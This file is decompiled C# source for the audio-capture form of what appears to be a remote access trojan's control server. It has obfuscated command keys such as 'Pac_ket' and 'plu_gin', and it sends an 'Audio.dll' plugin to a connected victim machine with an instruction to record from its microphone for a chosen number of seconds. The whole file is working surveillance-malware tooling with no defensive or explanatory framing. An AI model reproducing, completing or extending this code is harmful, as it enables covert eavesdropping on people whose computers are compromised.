﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.Media;
using System.Threading;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;

namespace Server.Forms
{
	// Token: 0x0200008A RID: 138
	public partial class FormAudio : Form
	{
		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x06000419 RID: 1049 RVA: 0x00004257 File Offset: 0x00002457
		// (set) Token: 0x0600041A RID: 1050 RVA: 0x0000425F File Offset: 0x0000245F
		public Form1 F { get; set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x0600041B RID: 1051 RVA: 0x00004268 File Offset: 0x00002468
		// (set) Token: 0x0600041C RID: 1052 RVA: 0x00004270 File Offset: 0x00002470
		internal Clients ParentClient { get; set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x0600041D RID: 1053 RVA: 0x00004279 File Offset: 0x00002479
		// (set) Token: 0x0600041E RID: 1054 RVA: 0x00004281 File Offset: 0x00002481
		internal Clients Client { get; set; }

		// Token: 0x0600041F RID: 1055 RVA: 0x0000428A File Offset: 0x0000248A
		public FormAudio()
		{
			this.InitializeComponent();
			base.MinimizeBox = false;
			base.MaximizeBox = false;
		}

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x06000420 RID: 1056 RVA: 0x000042B1 File Offset: 0x000024B1
		// (set) Token: 0x06000421 RID: 1057 RVA: 0x000042B9 File Offset: 0x000024B9
		public byte[] BytesToPlay { get; set; }

		// Token: 0x06000422 RID: 1058 RVA: 0x00023F3C File Offset: 0x0002213C
		private void btnStartStopRecord_Click(object sender, EventArgs e)
		{
			if (this.textBox1.Text != null)
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "audio";
				msgPack.ForcePathObject("Second").AsString = this.textBox1.Text;
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Pac_ket").AsString = "plu_gin";
				msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Audio.dll");
				msgPack2.ForcePathObject("Msgpack").SetAsBytes(msgPack.Encode2Bytes());
				ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
				Thread.Sleep(100);
				this.btnStartStopRecord.Text = "Wait...";
				this.btnStartStopRecord.Enabled = false;
				return;
			}
			MessageBox.Show("Input seconds to record.");
		}

		// Token: 0x06000423 RID: 1059 RVA: 0x00024028 File Offset: 0x00022228
		private void timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected || !this.ParentClient.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x040002F2 RID: 754
		private SoundPlayer SP = new SoundPlayer();
	}
}
